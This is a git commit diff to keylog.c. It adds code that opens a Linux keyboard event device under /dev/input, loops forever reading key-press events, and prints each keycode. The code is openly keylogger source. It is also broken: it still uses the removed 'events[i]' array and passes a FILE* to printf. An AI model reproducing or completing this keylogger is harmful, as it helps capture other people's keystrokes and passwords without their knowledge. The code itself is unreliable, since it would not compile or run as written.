944a6d5d87ef845298fed7789af8ddf7e66ed86a
Patrick <patrick.j.pastore@gmail.com>
2016-11-22 22:58:26 -0500

    Added keyboard reading to keylogger

--- keylog.c
+++ keylog.c
@@ -20,35 +20,31 @@ char *keys[] = {
   "0"
   }
 
-void keylogReadAndPrint(int keyboard, FILE *output)
+void keylogReadAndPrint(char *keyboardPath, FILE *output)
 {
-  struct input_event events[EVENT_NUM];
-  
-  //keylogger loop
-  while (1)
+  //open the eventX file that records keystrokes
+  char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
+  int device = open(keyboardPath, O_RDONLY);
+  struct input_event inpEvent;
+
+  // I don't know why we would need this, but a lot of code i read contained this to cancel loop when Ctrl-C is pressed; that already happens though
+  //signal(SIGINT, INThandler);
+
+  while(1)
   {
-    //not sure how this bytesRead works yet
-    bytesRead = read(keyboard, events, eventSize * EVENT_NUM);
-    
-    for (i = 0; i < bytesRead/eventSize; ++i)
+    read(device, &inpEvent, sizeof(inpEvent));  
+    //if the type of the event is a state change (like of a keyboard)
+    if (inpEvent.type == EV_KEY && inpEvent.value == 1)
     {
-      //if the type of the event is a state change (like of a keyboard)
-      if (events[i].type == EV_KEY)
+      //if the event code indicates a standard keyboard button
+      if (events[i].code > 0 && events[i].code < TOT_KEYS)
       {
-        //if event is a keypress
-        if (events[i].value == 1)
-        {
-          //if the event code indicates a standard keyboard button
-          if (events[i].code > 0 && events[i].code < TOT_KEYS)
-          {
-            //output the code of the standard keyboard button
-            printf(output, "%d\n", events[i].code);
-          }
-          else
-          {
-            printf(output, "Key not recognized\n");
-          }
-        }
+        //output the code of the standard keyboard button
+        printf(output, "%d\n", events[i].code);
+      }
+      else
+      {
+        printf(output, "Key not recognized\n");
       }
     }
   }
